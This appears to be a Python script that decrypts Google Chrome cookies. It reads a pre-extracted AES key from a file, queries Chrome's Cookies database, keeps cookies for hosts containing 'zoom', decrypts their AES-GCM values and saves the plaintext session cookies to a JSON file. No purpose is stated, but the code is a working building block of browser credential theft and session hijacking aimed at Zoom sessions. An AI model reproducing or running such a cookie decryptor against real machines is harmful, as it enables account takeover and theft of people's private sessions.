import os
import json
import base64
from sys import argv 
import win32crypt
import sqlite3
import json
import sys
from Crypto.Cipher import AES

class DecryptChrome():
    def __init__(self, local_state_key_dec_path):
        self.local_state_key_dec_path = local_state_key_dec_path
        self.decrypted_key = self.retrieve_decrypt_key()
    
    def retrieve_decrypt_key(self):
        file_obj = open(self.local_state_key_dec_path, "rb")
        key = file_obj.read()
        file_obj.close()
        
        return key
    
    def decypher_cookies(self, cookies_path):
        #Connect to the Cookies Database
        conn = sqlite3.connect(cookies_path)
        cursor = conn.cursor()
        cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
        
        results_array = []
        
        # Get the results
        file_obj = open(os.path.dirname(os.path.abspath(__file__)) + "\\cookies_results.json", "w")
        print(file_obj.name)
        for results in cursor.fetchall():
            key = results[0]
            name = results[1]
            if "zoom" in key:
                encrypted_value = results[2]
                decrypted_value = ""
                
                # DPAPI encrypted (before Chrome v80) https://stackoverflow.com/questions/60416350/chrome-80-how-to-decode-cookies
                if "01000000d08c9ddf0115d1118c7a00c04fc297eb" in str(encrypted_value.hex()):
                    print("Can't decipher yet :(")
                
                # Encryption of the cookies performed with AES-256 in GCM mode (after Chrome v80)
                else:
                    nonce = encrypted_value[3:3+12]
                    ciphertext = encrypted_value[3+12:-16]
                    tag = encrypted_value[-16:]
                    cipher = AES.new(self.decrypted_key, AES.MODE_GCM, nonce=nonce)
                    decrypted_value = cipher.decrypt_and_verify(ciphertext, tag).decode("utf-8")  # the decrypted cookie
                
                results_array.append({"key": key, "name": name, "value": decrypted_value})

        file_obj.write(json.dumps(results_array, indent=4))
        file_obj.close()